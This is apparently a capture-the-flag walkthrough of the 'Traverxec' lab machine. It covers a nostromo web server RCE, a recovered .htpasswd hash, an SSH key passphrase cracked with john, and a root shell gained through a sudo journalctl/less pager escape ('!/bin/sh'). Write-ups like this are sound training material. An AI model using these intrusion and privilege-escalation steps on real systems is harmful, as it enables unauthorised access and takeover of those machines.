# User

## nmap
```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## nostromo http server
A search reveals an RCE exploit(`nostromo.py`).  Using `./nostromo-shell.sh 10.10.10.165 80` allows the command injection to behave more like a shell.  Use it to enumerate the system.

## enumeration

Enumeration reveals an `.htpasswd` file in `/var/nostromo/conf/.htpasswd`.  Its contents reveal a hash `david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/`.  `/var/nostromo/conf/nhttpd.conf` reveals that public home directories are enabled.  Try to access `/home/david/public_www` and find a `protected-file-area` folder with a backup of ssh identify files.  Transfer the file
and unpack it.  Setup the ssh keys so you can use them.


## ssh as david
Use `ssh2john.puy` to convert `id_rsa` to a hash that john the ripper accepts:

```sh
./ssh2john.py ~/.ssh/keys/david@10.10.10.165 > ssh_priv_key_hash
```

Then use john the ripper on it

```sh
╭─zoey@nomadic ~/htb/traverxec ‹master*› 
╰─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh_priv_key_hash2
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (/home/zoey/.ssh/keys/david@10.10.10.165)
1g 0:00:00:02 DONE (2020-04-09 21:37) 0.3952g/s 5668Kp/s 5668Kc/s 5668KC/s   ozkelo..*7¡Vamos!
Session completed
```

Use the new password to login to the machine under the david account.  Grab user.txt

# Root

## enumeration
```sh
david@traverxec:~$ ls -la
total 1272
drwx--x--x 5 david david    4096 Apr 10 00:46 .
drwxr-xr-x 3 root  root     4096 Oct 25 14:32 ..
lrwxrwxrwx 1 root  root        9 Oct 25 16:15 .bash_history -> /dev/null
-rw-r--r-- 1 david david     220 Oct 25 14:32 .bash_logout
-rw-r--r-- 1 david david    3526 Oct 25 14:32 .bashrc
drwx------ 2 david david    4096 Oct 25 16:26 bin
-rw-r--r-- 1 david david   55085 Apr 10 00:43 le_david
-rwxr-xr-x 1 david david   46476 Mar 19 19:47 le.sh
-rw-r--r-- 1 david david     807 Oct 25 14:32 .profile
-rwxr-xr-x 1 david david 1156536 Mar 19 19:47 pspy64s
drwxr-xr-x 3 david david    4096 Oct 25 15:45 public_www
drwx------ 2 david david    4096 Oct 25 17:02 .ssh
-r--r----- 1 root  david      33 Oct 25 16:14 user.txt
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

## Privilege Escalation

Resize your window really small and run the sudo command.  This should call the pager which is less.  Once less runs type `!/bin/sh` to get root.